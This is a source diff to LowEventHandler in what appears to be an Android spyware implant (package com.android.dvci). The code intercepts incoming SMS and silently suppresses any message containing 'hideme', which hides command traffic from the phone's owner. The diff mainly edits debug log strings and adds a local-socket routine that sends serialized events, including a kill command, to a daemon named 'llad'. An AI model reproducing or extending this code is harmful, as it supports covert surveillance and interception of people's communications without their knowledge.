@@ -1,6 +1,7 @@
 package com.android.dvci.util;
 import android.net.LocalServerSocket;
 import android.net.LocalSocket;
+import android.net.LocalSocketAddress;
 import android.telephony.SmsMessage;
 import android.util.Log;
 import com.android.dvci.auto.Cfg;
@@ -38,12 +39,12 @@ public class LowEventHandler implements Runnable {
 	public static int dispatchNormalMessage(Object smsO) {
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "dispatchNormalMessage: start ok " + smsO);
+			Check.log(TAG + " dispatchNormalMessage: start ok " + smsO);
 		}
 		int callOrig = 1;
 		if (smsO == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: sms0 null ");
+				Check.log(TAG + " dispatchNormalMessage: sms0 null ");
 			}
 			return callOrig;
 		}
@@ -51,25 +52,25 @@ public class LowEventHandler implements Runnable {
 		try {
 			byte[][] pdus = new byte[1][];
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: asking pdu ");
+				Check.log(TAG + " dispatchNormalMessage: asking pdu ");
 			}
 			pdus[0] = Reflect.on(smsO).call("getPdu").get();
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: got it");
+				Check.log(TAG + " dispatchNormalMessage: got it");
 			}
 			SmsMessage sms = SmsMessage.createFromPdu(pdus[0]);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: processing " + sms.getMessageBody());
+				Check.log(TAG + " dispatchNormalMessage: processing " + sms.getMessageBody());
 			}
 			if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
+					Check.log(TAG + " dispatchNormalMessage: Don't call origin ");
 				}
 				callOrig = 0;
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "dispatchNormalMessage:  call origin");
+					Check.log(TAG + " dispatchNormalMessage:  call origin");
 				}
 				callOrig = 1;
 
@@ -77,7 +78,7 @@ public class LowEventHandler implements Runnable {
 
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: Exception:", e);
+				Check.log(TAG + " dispatchNormalMessage: Exception:", e);
 			}
 		}
 		return callOrig;
@@ -88,16 +89,16 @@ public class LowEventHandler implements Runnable {
 		SmsMessage sms = SmsMessage.createFromPdu(pdu);
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "dispatchNormalMessage: processing " + sms.getMessageBody());
+			Check.log(TAG + " dispatchNormalMessage: processing " + sms.getMessageBody());
 		}
 		if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage: Don't call origin ");
+				Check.log(TAG + " dispatchNormalMessage: Don't call origin ");
 			}
 			callOrig = 0;
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessage:  call origin");
+				Check.log(TAG + " dispatchNormalMessage:  call origin");
 			}
 			callOrig = 1;
 
@@ -107,12 +108,12 @@ public class LowEventHandler implements Runnable {
 	public static int silentSmsPdu(LowEvent<byte[]> lsms) {
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "silentSmsPdu: start ok ");
+			Check.log(TAG + " silentSmsPdu: start ok ");
 		}
 		int callOrig = 1;
 		if (lsms.data.length==0) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "silentSmsPdu: pdus zero size ");
+				Check.log(TAG + " silentSmsPdu: pdus zero size ");
 			}
 			return callOrig;
 		}
@@ -161,7 +162,7 @@ public class LowEventHandler implements Runnable {
 			}, 1, TimeUnit.SECONDS);
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "silentSmsPdu: Exception:", e);
+				Check.log(TAG + " silentSmsPdu: Exception:", e);
 			}
 		}
 		return callOrig;
@@ -169,12 +170,12 @@ public class LowEventHandler implements Runnable {
 	public static int dispatchNormalMessagePdu(LowEvent<byte[]> lsms) {
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "dispatchNormalMessagePdu: start ok ");
+			Check.log(TAG + " dispatchNormalMessagePdu: start ok ");
 		}
 		int callOrig = 1;
 		if (lsms.data.length==0) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessagePdu: pdus zero size ");
+				Check.log(TAG + " dispatchNormalMessagePdu: pdus zero size ");
 			}
 			return callOrig;
 		}
@@ -182,16 +183,16 @@ public class LowEventHandler implements Runnable {
 		try {
 			SmsMessage sms = SmsMessage.createFromPdu(lsms.data);
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessagePdu: processing " + sms.getMessageBody());
+				Check.log(TAG + " dispatchNormalMessagePdu: processing " + sms.getMessageBody());
 			}
 			if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "dispatchNormalMessagePdu: Don't call origin ");
+					Check.log(TAG + " dispatchNormalMessagePdu: Don't call origin ");
 				}
 				callOrig = 0;
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "dispatchNormalMessagePdu:  call origin");
+					Check.log(TAG + " dispatchNormalMessagePdu:  call origin");
 				}
 				callOrig = 1;
 
@@ -199,22 +200,119 @@ public class LowEventHandler implements Runnable {
 
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "dispatchNormalMessagePdu: Exception:", e);
+				Check.log(TAG + " dispatchNormalMessagePdu: Exception:", e);
 			}
 		}
 		return callOrig;
 	}
 
+	private static LowEventHandlerDefs sendSerialObj(LowEventHandlerDefs obj) {
+		if (obj==null){
+			return null;
+		}
+		LocalSocket sender = new LocalSocket();
+		obj.res=1;
+		try {
+			sender.connect(new LocalSocketAddress("llad"));
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "SENT DATA ");
+			}
+			int timeout = 5;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "wait connection..");
+			}
+			while (timeout-- > 0) {
+				if (sender.isBound() && sender.isConnected()) {
+					break;
+				} else {
+					Log.d(TAG, ".");
+				}
+				Utils.sleep(100);
+			}
+			if (!(sender.isBound() && sender.isConnected())) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (connection failed): ");//$NON-NLS-1$
+				}
+				return obj;
+			}
+			DataInputStream streamIn = new DataInputStream(new
+					BufferedInputStream(sender.getInputStream()));
+			DataOutputStream streamOut = new DataOutputStream(new
+					BufferedOutputStream(sender.getOutputStream()));
+			ObjectOutputStream oos = new ObjectOutputStream(streamOut);
+			oos.writeObject(obj);
+			oos.flush();
+			streamOut.flush();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (object sent): ");//$NON-NLS-1$
+			}
+			obj = null;
+			timeout = 10;
+			int available = 0;
+			while (timeout-- > 0 && available <= 0) {
+				try {
+					if (sender.isBound() && sender.isConnected()) {
+						try {
+							available = streamIn.available();
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (getAvailable): " + available);//$NON-NLS-1$
+							}
+							if (available > 0) {
+
+								ObjectInputStream ois = new ObjectInputStream(streamIn);
+								obj = (LowEventHandlerDefs) ois.readObject();
+								if (Cfg.DEBUG) {
+									Check.log(TAG + "GOT DATA " + obj);
+								}
+							}
+						} catch (Exception e) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (is available) Error: ", e);//$NON-NLS-1$
+							}
+						}
+					} else {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (getAvailable) sender not connected");//$NON-NLS-1$
+						}
+
+					}
+
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (getAvailable) Error: ", e);//$NON-NLS-1$
+					}
+				}
+				Utils.sleep(100);
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (exiting): t=" + timeout + " a=" + available);//$NON-NLS-1$
+			}
+			Utils.sleep(100);
+		}catch (Exception e){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (LocalSocketAddress) Error: ", e);//$NON-NLS-1$
+			}
+		}
+		return obj;
+	}
 	public void closeSocketServer() {
 		accept = false;
-		if(server != null) {
-			try {
-				server.close();
-			} catch (IOException e) {
-				e.printStackTrace();
-			}
+		if ( thread != null ) {
 			while (server != null) {
+				thread.interrupt();
 				Utils.sleep(100);
+				if (server != null) {
+					try {
+						server.close();
+					} catch (IOException e) {
+						e.printStackTrace();
+						continue;
+					}
+				}
+				LowEventHandlerDefs obj = new LowEventHandlerDefs();
+				obj.data = null;
+				obj.type = LowEventHandlerDefs.EVENT_TYPE_KILL;
+				obj = sendSerialObj(obj);
 			}
 		}
 	}
@@ -256,7 +354,12 @@ public class LowEventHandler implements Runnable {
 								if (Cfg.DEBUG) {
 									Check.log(TAG + " SENT reply " + event);
 								}
-							} else {
+							} if(event.type == LowEventHandlerDefs.EVENT_TYPE_KILL) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " SENT Kill");
+									event.res = 1;
+								}
+							}else{
 								event.res = 1;
 							}
 							timeout = 10;
@@ -287,6 +390,7 @@ public class LowEventHandler implements Runnable {
 				}
 			}
 			server.close();
+			server = null;
 		} catch (IOException ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "IOEXCEPTION", ex);
